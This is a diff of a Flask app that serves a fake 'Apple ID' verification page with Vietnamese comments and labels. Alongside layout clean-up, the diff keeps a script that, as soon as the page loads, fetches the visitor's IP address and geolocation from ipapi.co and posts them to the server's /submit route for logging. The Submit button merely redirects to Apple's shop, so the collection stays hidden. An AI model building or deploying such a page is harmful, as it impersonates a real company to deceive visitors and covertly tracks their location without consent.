@@ -1,5 +1,5 @@
-from gzip import READ
 from flask import Flask, Response, request, jsonify
+import os
 
 app = Flask(__name__)
 
@@ -36,40 +36,6 @@ HTML_PAGE = '''
       display: flex;
       justify-content: center;
       margin-top: 140px;
-      @media (max-width: 480px) {
-  .content {
-    margin-top: 100px;
-    padding: 0 10px;
-  }
-
-  .apple-block {
-    width: 100%;
-    padding: 30px 20px;
-    max-width: 360px;  
-    padding: 20px 16px;
-  }
-
-  button.verify-button {
-    width: 100%;
-  }
-
-  header {
-    flex-direction: column;
-    align-items: flex-start;
-    gap: 10px;
-  }
-
-  header nav {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 10px;
-  }
-
-  header nav a {
-    font-size: 12px;
-  }
-}
-
     }
     .apple-block {
       background: white;
@@ -131,101 +97,55 @@ HTML_PAGE = '''
     </nav>
   </header>
 
-<div class="content">
-  <div class="apple-block">
-    <div class="apple-logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo" />
+  <div class="content">
+    <div class="apple-block">
+      <div class="apple-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo" />
+      </div>
+      <h1>Apple ID</h1>
+      <p class="description">Confirm opening Apple website</p>
+      <button class="verify-button" id="verifyBtn">Submit</button>
+      <div id="status"></div>
+      <a href="https://www.apple.com/legal/internet-services/itunes/vn/terms.html" target="_blank" style="font-size:13px; color:#0071e3; text-decoration:none; display:block; margin-top:10px;">
+        Điều khoản & Dịch vụ của Apple
+      </a>
     </div>
-    <h1>Apple ID</h1>
-    <p class="description">Confirm opening Apple website</p>
-    <button class="verify-button" id="verifyBtn">Submit</button>
-
-<script>
-  document.getElementById("verifyBtn").addEventListener("click", function () {
-    window.location.href = "https://www.apple.com/shop";
-  });
-</script>
-
-    <div id="status"></div>
-    <a href="https://www.apple.com/legal/internet-services/itunes/vn/terms.html" target="_blank" style="font-size:13px; color:#0071e3; text-decoration:none; display:block; margin-top:10px;">
-      Điều khoản & Dịch vụ của Apple
-    </a>
   </div>
- </div>
+
   <div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
-  Website chính thức của apple
-  </a>
+    Website chính thức của apple
   </div>
-</div>
 
-<div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
-</div>
-
-<!-- Gửi IP về server khi trang vừa tải -->
-<script>
-  window.addEventListener('DOMContentLoaded', async () => {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-
-      const payload = {
-        ip: data.ip,
-        latitude: data.latitude,
-        longitude: data.longitude
-      };
-
-      await fetch('/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      });
-
-      console.log("✅ IP & vị trí đã gửi:", payload);
-    } catch (err) {
-      console.error("❌ Lỗi khi gửi IP:", err);
-    }
-  });
-
-  // Khi bấm nút Submit thì chuyển đến trang Apple Shop
-  document.getElementById("verifyBtn").addEventListener("click", () => {
-    window.location.href = "https://www.apple.com/shop/";
-  });
-</script>
   <script>
-  // Gửi IP + vị trí ngay khi trang vừa tải
-  window.addEventListener('DOMContentLoaded', async () => {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
+    window.addEventListener('DOMContentLoaded', async () => {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
 
-      const payload = {
-        ip: data.ip,
-        latitude: data.latitude,
-        longitude: data.longitude
-      };
+        const payload = {
+          ip: data.ip,
+          latitude: data.latitude,
+          longitude: data.longitude
+        };
 
-      await fetch('/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      });
+        await fetch('/submit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
 
-      console.log("✅ IP & vị trí đã gửi:", payload);
-    } catch (err) {
-      console.error("❌ Lỗi khi gửi IP:", err);
-    }
-  });
+        console.log("✅ IP & vị trí đã gửi:", payload);
+      } catch (err) {
+        console.error("❌ Lỗi khi gửi IP:", err);
+      }
+    });
 
-  // Nút Submit chỉ để chuyển hướng
-  document.getElementById("verifyBtn").addEventListener("click", () => {
-    window.location.href = "https://www.apple.com/shop/";
-  });
-</script>
-
+    document.getElementById("verifyBtn").addEventListener("click", () => {
+      window.location.href = "https://www.apple.com/shop/";
+    });
+  </script>
 </body>
 </html>
 '''
@@ -239,7 +159,16 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    data = request.get_json()
+    try:
+        data = request.get_json()
+        print("[📥] Dữ liệu nhận được:", data)
+    except Exception as e:
+        print("❌ Không đọc được JSON:", e)
+        return jsonify({'error': 'Lỗi đọc JSON'}), 400
+
+    if not data:
+        return jsonify({'error': 'Không có dữ liệu gửi lên'}), 400
+
     ip = data.get('ip')
     lat = data.get('latitude')
     lon = data.get('longitude')
@@ -251,11 +180,5 @@ def submit():
     return jsonify({'message': 'Đã nhận dữ liệu xác minh'}), 200
 
 if __name__ == '__main__':
-    import os
-
-READ
-port = int(os.environ.get("PORT", 10000))
-
-port = int(os.environ.get("PORT", 10001))
-app.run(host='0.0.0.0', port=port, debug=True)
-
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port, debug=True)
